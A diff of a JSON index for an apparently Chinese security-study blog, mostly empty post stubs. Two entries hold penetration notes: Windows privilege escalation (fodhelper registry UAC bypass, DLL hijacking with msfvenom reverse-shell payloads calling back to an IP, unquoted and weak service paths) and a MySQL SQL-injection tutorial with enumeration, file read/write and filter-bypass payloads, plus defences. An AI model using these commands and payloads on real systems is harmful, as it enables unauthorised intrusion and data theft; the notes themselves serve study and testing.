ok      1\nc:\\windows\\system32\\DeviceEject.exe                     ok  \nc:\\windows\\system32\\DeviceProperties.exe                ok\nc:\\windows\\system32\\djoin.exe                           ok\nc:\\windows\\system32\\easinvoker.exe                      ok\nc:\\windows\\system32\\EASPolicyManagerBrokerHost.exe      ok\nc:\\windows\\system32\\eudcedit.exe                        ok      1\nc:\\windows\\system32\\eventvwr.exe                        ok      1\nc:\\windows\\system32\\fodhelper.exe                       ok      1\nc:\\windows\\system32\\fsquirt.exe                         ok      1\nc:\\windows\\system32\\FXSUNATD.exe                        ok\nc:\\windows\\system32\\immersivetpmvscmgrsvr.exe           ok\nc:\\windows\\system32\\iscsicli.exe                        ok      1\nc:\\windows\\system32\\iscsicpl.exe                        ok      1\n查询注册表Shell\\Open\\command键值对\n通常以shell\\open\\command命名的键值对存储的是可执行文件路径，静默提升权限后即可运行该键值对程序。\nProcmon监听找到程序注册表信息，过滤 ![[6.jpg]] 会去查询 `HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command`，然后在注册表创建该键值对，从而绕过UAC\n**注册表劫持绕过**\nFodhelper.exe\n![[3240693-20230731221055025-1411728646.png]] 执行注册表写入：\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Windows\\System32\\cmd.exe /f\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f\n不同位数cmd窗口可能显示不同，Fodhelper仅适用于Win10\n执行-x64：\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Users\\huangzonghui\\Desktop\\1\\msf.exe /f\nreg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f\n![[屏幕截图 2025-10-23 183641.png]] 反弹成功，执行getsystem提权\nWin系统提权-本地普通用户-DLL劫持\nDLL劫持提权应用配合MSF-FlashFXP\n原理：Windows程序启动时需要DLL。如果DLL不存在，则可以在程序查找位置放置恶意DLL提权。搜索顺序：\n1、应用程序加载目录 2、C:\\Windows\\System32 3、C:\\Windows\\System 4、C:\\Windows 5、当前工作目录（CWD） 6、PATH环境变量目录（系统优先于用户）\n过程：信息收集 → 进程调试 → 制作dll并上传 → 替换dll → 等待应用启动\n检测：\nChkDllHijack\n火绒剑\n项目：[https://github.com/anhkgg/anhkgg-tools](https://github.com/anhkgg/anhkgg-tools)\n![[屏幕截图 2025-10-23 185636.png]]\n利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。\n生成DLL：\n./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/libeay32.dll\nor\n./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/ssleay32.dll\n上传DLL：\nmeterpreter > upload /usr/src/metasploit-framework/shell/libeay32.dll C:\\\\Users\\\\huangzonghui\\\\Desktop\\\\2\\\\FlashFXP\n![[屏幕截图 2025-10-23 191425.png]] 执行成功上线 ![[屏幕截图 2025-10-23 191549.png]] 程序非正常 ![[屏幕截图 2025-10-23 191626.png]]\nWin系统提权-本地普通用户-未引号服务\n不带引号服务路径配合MSF-MacroExpert\n原理：服务路径配置由于目录空格问题，可上传恶意文件触发执行 过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 等待调用成功\n检测命令：\nwmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n![[屏幕截图 2025-10-23 191957.png]]\n上传反弹exe ![[屏幕截图 2025-10-23 193119.png]]\n设置执行名后，执行：\nsc start \"Macro Expert\"\n![[Pasted image 20251023193519.png]] 反弹成功 ![[屏幕截图 2025-10-23 193513.png]]\nWin系统提权-本地管理用户-不安全权限\n不安全的服务权限配合MSF-NewServices\n原理：即使正确引用服务路径，也可能存在其他漏洞。管理配置错误，用户可能对服务拥有过多权限，可直接修改导致重定向执行文件。\n过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 调用成功\n检测脚本：[https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)\naccesschk.exe -uwcqv \"huangzonghui\" * -accepteula\nsc config \"test\" binpath= \"C:\\Program.exe\"\nsc start test\n综合类检测项目\nPEAS-ng适用于Windows、Linux/Unix*和MacOS权限提升工具 项目：[https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)\nwinPEAS.bat > result.txt\nwinPEASany.exe log=result.txt\n排查信息，获取有用权限数据 ![[屏幕截图 2025-10-23 195206.png]]"
+    },
+    {
+      "slug": "app3",
+      "title": "app3",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "2026-01-01T10:00:00",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/app/app3",
+      "section_path": [
+        "APP攻防"
+      ],
+      "categories": [
+        "APP攻防"
+      ],
+      "tags": [],
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
+    },
+    {
+      "slug": "app2",
+      "title": "app2",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "2026-01-01T10:00:00",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/app/app2",
+      "section_path": [
+        "APP攻防"
+      ],
+      "categories": [
+        "APP攻防"
+      ],
+      "tags": [],
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
+    },
+    {
+      "slug": "app1",
+      "title": "app1",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "2026-01-01T10:00:00",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/app/app1",
+      "section_path": [
+        "APP攻防"
+      ],
+      "categories": [
+        "APP攻防"
+      ],
+      "tags": [],
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "2.suid_sudo",
@@ -1056,392 +1142,498 @@
       "article_body_text": "一、目标与概述\n目的\n：通过 SQL 注入（以 MySQL 为例）获取 Web 应用可操作的数据或权限（例如：查询数据库名称、表名、字段、读写文件、横向跨库取证等）。\n本笔记覆盖：\n常见检测与信息收集（系统、用户、数据库名、版本）\n基于\ninformation_schema\n的枚举方法\n跨库查询与文件读写（受限于权限与\nsecure-file-priv\n）\n绕过/编码技巧、堆叠注入、Access 特殊处理\n常用工具与防护建议\n二、注入思路（四条信息）\n开始注入前通常先判断以下四类信息，以便选择后续策略：\n数据库版本\n（\nversion()\n）\nMySQL 5.0 以上自带\ninformation_schema\n，能查询库/表/列等元信息。\n常用判断：\nversion()\n或\nselect version()\n。\n数据库用户\n（\nuser()\n）\nroot\n用户通常有更多权限（跨库/文件读写概率更高）；非\nroot\n则可能受限。\n常用判断：\nuser()\n。\n操作系统\n（\n@@version_compile_os\n）\n判断大小写敏感、路径风格（Windows\nC:\\\nvs Linux\n/var/www\n）等。影响文件读写路径与大小写处理。\n当前数据库名\n（\ndatabase()\n）\n用于定位目标数据库，配合\ninformation_schema\n查找表名和字段名。\n注：若目标无明显数据回显（盲注场景），需转为布尔/时间盲注或使用 out-of-band 技术。\n三、常见注入示例（回显型）\n1. 排序/回显定位\n-- 确定字段数量（order by）\n...\nORDER\nBY\n6\n-- 如果 6 报错说明列数小于 6\n-- 使用 UNION 定位回显列\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\n4\n,\n5\n,\n6\n2. 在回显位置插入查询\n-- 在可回显列插入 database(), user(), version()\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\ndatabase\n(),\nuser\n(),\n6\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\nversion\n(),\n@@\nversion_compile_os,\n6\n3. 利用 information_schema 枚举（MySQL >= 5.0）\n-- 获取所有数据库名\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\n4\n,GROUP_CONCAT(\nschema_name\n),\n6\nFROM\ninformation_schema.schemata\n-- 获取特定数据库的表名\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\n4\n,GROUP_CONCAT(\ntable_name\n),\n6\nFROM\ninformation_schema.tables\nWHERE\ntable_schema\n=\n'demo01'\n-- 获取表的字段名\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\n4\n,GROUP_CONCAT(\ncolumn_name\n),\n6\nFROM\ninformation_schema.columns\nWHERE\ntable_name\n=\n'admin'\n-- 查询指定表的内容（限制行数）\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,username,password,\n6\nFROM\nadmin\nLIMIT\n0\n,\n1\ngroup_concat()\n常用于将多行合并成单行输出，适用于回显列有限的场景。\n四、跨库查询（PHP + MySQL 场景）\n影响条件\n：取决于当前连接的 MySQL 用户权限（是否有访问其他库的权限，通常\nroot\n可以）。\n示例\n：通过 B 网站的注入点，查询 A 网站数据库\nzblog\n中的表\nzbp_member\n。\n-- 列出所有库\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\n4\n,GROUP_CONCAT(\nschema_name\n),\n6\nFROM\ninformation_schema.schemata\n-- 获取 zblog 库的表\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\n4\n,GROUP_CONCAT(\ntable_name\n),\n6\nFROM\ninformation_schema.tables\nWHERE\ntable_schema\n=\n'zblog'\n-- 获取 zbp_member 的字段（指定库名以避免同名表干扰）\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,\n4\n,GROUP_CONCAT(\ncolumn_name\n),\n6\nFROM\ninformation_schema.columns\nWHERE\ntable_name\n=\n'zbp_member'\nAND\ntable_schema\n=\n'zblog'\n-- 查询 zblog 库中具体表（前提：有权限）\n...\nUNION\nSELECT\n1\n,\n2\n,\n3\n,mem_Name,mem_Password,\n6\nFROM\nzblog.zbp_member\n结论\n：\n普通用户可能无法访问\ninformation_schema\n或其他库（会被拒绝或返回空）；\nroot\n或具有足够权限的用户可以跨库查询任意表。\n五、文件读写（load_file / into outfile）\n影响条件\n：数据库用户权限、\nsecure-file-priv\n配置、目标系统路径权限。\nsecure_file_priv\nsecure_file_priv 的值非NULL或包含了导出的绝对路径\nsecure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出\nMysql>=5.5.53 默认为NULL，即默认禁止导入导出\nMysql<5.5.53 默认为空，即默认无限制\n查看secure_file_priv值的方法\n1.在my.ini配置文件里面看\n2.执行sql语句\nshow\nglobal\nvariables\nlike\n'%secure%'\n;\nsecure_file_priv显示NULL说明没有权限\n需要在mysql目录下的my.ini修改配置文件secure_file_priv=空\n常见 payload：\n-- 读取目标文件（Windows 路径示例）\n...\nUNION\nSELECT\n1\n, LOAD_FILE(\n'd:\\\\1.txt'\n),\n3\n,\n4\n,\n5\n,\n6\n-- 写入文件到磁盘（需要 FILE 权限，并受 secure-file-priv 限制）\n...\nUNION\nSELECT\n1\n,\n'111'\n,\n3\n,\n4\n,\n5\n,\n6\nINTO\nOUTFILE\n'd:\\\\2.txt'\n路径获取技巧\n：\n错误信息常会泄露路径；\nphpinfo()\n页面可能泄露安装路径；\n猜测常见软件/中间件默认安装路径（如\n/var/www/\n,\nC:\\xampp\\htdocs\\\n等）。\n六、过滤绕过与编码技巧\n1. 单引号过滤策略\n如果单引号被过滤或转义：尝试使用十六进制编码、不带单引号的函数或利用注释闭合等方式。\n常见方法：\n0x...\n（十六进制）、\nchar()\n、\nconcat()\n、\nprepare/execute\n等。\n2. 编码逃逸（示例）\n将 SQL 语句以十六进制表示赋值给变量，再用\nprepare ... from\n与\nexecute\n执行：\n-- 将 select * from `1919810931114514` 用 0x 十六进制编码后执行\n1\n'; SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460; PREPARE execsql FROM @a; EXECUTE execsql; #\n此类技巧常用来绕过 WAF 和字符串过滤。\n七、Access（MDB）与堆叠注入\nAccess 数据库（ASP + MDB）\n无标准用户体系，用\nsqlmap\n字典爆破可能不稳定；\n若知道表名/列名，直接用查询；若未知则需枚举或人工分析。\n堆叠注入（Stacked Queries）\nMySQL 支持多语句（视驱动而定），可以使用\n;\n执行多条语句（例如：\nSHOW DATABASES;\n）。\n示例用法（查看/修改表结构）：\n-- 查看所有数据库\n1\n'; SHOW DATABASES; --\n-- 通过 rename / alter 做表改名或新增列（需足够权限）\n1'\n;\nRENAME\nTABLE\nwords\nTO\nBaiMao;\nALTER\nTABLE\nwords\nADD\nid INT UNSIGNED\nNOT\nNULL\nAUTO_INCREMENT\nPRIMARY\nKEY\n;\nALTER\nTABLE\nwords CHANGE flag\ndata\nVARCHAR(\n100\n);\n#\n注意\n：堆叠注入在很多现代框架/驱动中被禁用或受限。\n八、读取技巧：HANDLER（替代 SELECT）\nHANDLER\n操作常用于低级读取，示例：\n1\n'; HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;\n1'\n;\nHANDLER\nFlagHere\nOPEN\n;\nHANDLER\nFlagHere\nREAD\nNEXT\n;\nHANDLER\nFlagHere\nCLOSE\n;\n用于逐行读取表数据（在某些环境下比\nSELECT\n更易成功）。\n九、常用工具与检测流程\n工具\n：\nsqlmap\n、\nBurp Suite\n、\nsqlninja\n（针对 MSSQL）、\nnmap --script\n（发现 web 漏洞）等。\n检测流程（典型）\n：\n参数注入点识别（GET/POST/头部/COOKIE）；\n列数探测（\nORDER BY\n）与回显列定位（\nUNION SELECT\n）；\n信息枚举（\nversion()\n、\nuser()\n、\ndatabase()\n）；\n枚举\ninformation_schema\n（表/列）；\n数据提取（\nLIMIT\n分页）或盲注（布尔/时间）;\n横向扩展（跨库/文件读写）——视权限而定。\n十、防护\n使用参数化查询（Prepared Statements）或 ORM，避免字符串拼接 SQL；\n对用户输入进行严格校验与最小化权限原则（数据库用户只赋予必要权限）；\n关闭或限制\nLOAD_FILE\n/\nINTO OUTFILE\n权限；设置合理的\nsecure-file-priv\n；\n数据库用户不使用\nroot\n：不同服务使用不同低权限用户；\n开启 Web 应用 WAF 与异常日志告警，定期审计 SQL 日志；\n对错误信息进行脱敏，避免泄露路径与 SQL 错误栈。\n附：常见 payload\nORDER BY n\n：探测列数\nUNION SELECT ...\n：回显型注入\nLOAD_FILE(...)\n,\nINTO OUTFILE 'path'\n：文件读写\n十六进制编码 +\nPREPARE/EXECUTE\n：绕过过滤\n布尔/时间盲注：\nIF(condition, SLEEP(5), NULL)\n参考\nOWASP SQL Injection Cheat Sheet\nsqlmap 文档与使用手册\nMySQL 官方文档（\ninformation_schema\n）"
     },
     {
-      "slug": "app3",
-      "title": "app3",
-      "categories": [
-        "APP攻防"
-      ],
-      "tags": [],
-      "date_iso": "2026-01-01T10:00:00",
-      "rel_permalink": "list/app/app3",
-      "word_count": 0,
-      "reading_minutes": 0,
-      "source_note": ""
-    },
-    {
-      "slug": "app2",
-      "title": "app2",
-      "categories": [
-        "APP攻防"
-      ],
-      "tags": [],
-      "date_iso": "2026-01-01T10:00:00",
-      "rel_permalink": "list/app/app2",
-      "word_count": 0,
-      "reading_minutes": 0,
-      "source_note": ""
-    },
-    {
-      "slug": "app1",
-      "title": "app1",
-      "categories": [
-        "APP攻防"
-      ],
-      "tags": [],
-      "date_iso": "2026-01-01T10:00:00",
-      "rel_permalink": "list/app/app1",
-      "word_count": 0,
-      "reading_minutes": 0,
-      "source_note": ""
-    },
-    {
       "slug": "rce",
       "title": "rce",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/base_bug/rce",
+      "section_path": [
+        "base_bug"
+      ],
       "categories": [
         "base_bug"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/base_bug/rce",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "sql注入",
       "title": "sql注入",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/base_bug/sql注入",
+      "section_path": [
+        "base_bug"
+      ],
       "categories": [
         "base_bug"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/base_bug/sql注入",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "ssrf",
       "title": "ssrf",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/base_bug/ssrf",
+      "section_path": [
+        "base_bug"
+      ],
       "categories": [
         "base_bug"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/base_bug/ssrf",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "xss",
       "title": "xss",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/base_bug/xss",
+      "section_path": [
+        "base_bug"
+      ],
       "categories": [
         "base_bug"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/base_bug/xss",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "xxe",
       "title": "xxe",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/base_bug/xxe",
+      "section_path": [
+        "base_bug"
+      ],
       "categories": [
         "base_bug"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/base_bug/xxe",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "文件漏洞",
       "title": "文件漏洞",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/base_bug/文件漏洞",
+      "section_path": [
+        "base_bug"
+      ],
       "categories": [
         "base_bug"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/base_bug/文件漏洞",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "linux",
       "title": "linux",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/权限提升/linux",
+      "section_path": [
+        "权限提升"
+      ],
       "categories": [
         "权限提升"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/权限提升/linux",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "windows",
       "title": "windows",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/权限提升/windows",
+      "section_path": [
+        "权限提升"
+      ],
       "categories": [
         "权限提升"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/权限提升/windows",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "7ziplou-dong-fu-xian-he-ji",
       "title": "7ziplou-dong-fu-xian-he-ji",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/7ziplou-dong-fu-xian-he-ji",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/7ziplou-dong-fu-xian-he-ji",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "apache-solr-rcelou-dong-fu-xian",
       "title": "apache-solr-rcelou-dong-fu-xian",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/apache-solr-rcelou-dong-fu-xian",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/apache-solr-rcelou-dong-fu-xian",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "apache-struts2-ognl-rcezhu-ru",
       "title": "apache-struts2-ognl-rcezhu-ru",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/apache-struts2-ognl-rcezhu-ru",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/apache-struts2-ognl-rcezhu-ru",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "apache_shiro-cve-2016-4437-fan-xu-lie-hua-lou-dong-fu-xian",
       "title": "apache_shiro-cve-2016-4437-fan-xu-lie-hua-lou-dong-fu-xian",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/apache_shiro-cve-2016-4437-fan-xu-lie-hua-lou-dong-fu-xian",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/apache_shiro-cve-2016-4437-fan-xu-lie-hua-lou-dong-fu-xian",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "cve-2025-55182de-fu-xian-yu-xiu-fu",
       "title": "cve-2025-55182de-fu-xian-yu-xiu-fu",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/cve-2025-55182de-fu-xian-yu-xiu-fu",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/cve-2025-55182de-fu-xian-yu-xiu-fu",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "cve-2025-55725",
       "title": "cve-2025-55725",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/cve-2025-55725",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/cve-2025-55725",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "cve-2026-24061-telnetyuan-cheng-ren-zheng-rao-guo",
       "title": "cve-2026-24061-telnetyuan-cheng-ren-zheng-rao-guo",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/cve-2026-24061-telnetyuan-cheng-ren-zheng-rao-guo",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/cve-2026-24061-telnetyuan-cheng-ren-zheng-rao-guo",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben",
       "title": "fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "log4j2-cve-2021-44228lou-dong-fu-xian",
       "title": "log4j2-cve-2021-44228lou-dong-fu-xian",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/log4j2-cve-2021-44228lou-dong-fu-xian",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/log4j2-cve-2021-44228lou-dong-fu-xian",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "mongodblou-dong-fu-xian-cve-2025-14847",
       "title": "mongodblou-dong-fu-xian-cve-2025-14847",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/mongodblou-dong-fu-xian-cve-2025-14847",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/mongodblou-dong-fu-xian-cve-2025-14847",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "redis-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2025-49844",
       "title": "redis-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2025-49844",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/redis-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2025-49844",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/redis-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2025-49844",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     },
     {
       "slug": "spring4shell-cve-2022-22965yuan-li-ji-fu-xian",
       "title": "spring4shell-cve-2022-22965yuan-li-ji-fu-xian",
+      "source_note": "",
+      "summary": "",
+      "date_iso": "",
+      "word_count": 0,
+      "reading_minutes": 0,
+      "rel_permalink": "list/漏洞复现/spring4shell-cve-2022-22965yuan-li-ji-fu-xian",
+      "section_path": [
+        "漏洞复现"
+      ],
       "categories": [
         "漏洞复现"
       ],
       "tags": [],
-      "date_iso": "",
-      "rel_permalink": "list/漏洞复现/spring4shell-cve-2022-22965yuan-li-ji-fu-xian",
-      "word_count": 0,
-      "reading_minutes": 0
+      "featured": false,
+      "body_html": "",
+      "toc_html": "",
+      "article_body_text": ""
     }
   ],
   "sections": {
     "app": {
-      "dir_name": "app",
-      "posts": [
-        "app1",
-        "app2",
-        "app3"
-      ],
-      "page": 1
+      "slug": "app",
+      "title": "app",
+      "parent": "",
+      "order": 0
     },
     "base_bug": {
-      "dir_name": "base_bug",
-      "posts": [
-        "csrf",
-        "rce",
-        "sql注入",
-        "ssrf",
-        "xss",
-        "xxe",
-        "文件漏洞"
-      ],
-      "page": 1
+      "slug": "base_bug",
+      "title": "base_bug",
+      "parent": "",
+      "order": 0
     },
     "burpsuite靶场": {
-      "dir_name": "burpsuite靶场",
-      "posts": [
-        "1.jwtshi-yan-ba-chang",
-        "shang-ye-gui-ze-zhi-xing-bu-dang"
-      ],
-      "page": 1
+      "slug": "burpsuite靶场",
+      "title": "burpsuite靶场",
+      "parent": "",
+      "order": 0
     },
     "业务逻辑漏洞": {
-      "dir_name": "业务逻辑漏洞",
-      "posts": [
-        "1-qian-yue-lou-dong",
-        "2-gao-bing-fa"
-      ],
-      "page": 1
+      "slug": "业务逻辑漏洞",
+      "title": "业务逻辑漏洞",
+      "parent": "",
+      "order": 0
     },
     "云上攻防": {
-      "dir_name": "云上攻防",
-      "posts": [
-        "3-yun-yuan-sheng-dockertao-yi"
-      ],
-      "page": 1
+      "slug": "云上攻防",
+      "title": "云上攻防",
+      "parent": "",
+      "order": 0
     },
     "内网渗透": {
-      "dir_name": "内网渗透",
-      "posts": [
-        "2.msf-cobaltstrikeshi-xian-nei-wang-socksdai-li-zhuan-fa-shang-xian"
-      ],
-      "page": 1
+      "slug": "内网渗透",
+      "title": "内网渗透",
+      "parent": "",
+      "order": 0
     },
     "工具使用": {
-      "dir_name": "工具使用",
-      "posts": [
-        "aicryptoproxy-ai-fu-neng-ni-xiang-web-jia-mi-liu-liang",
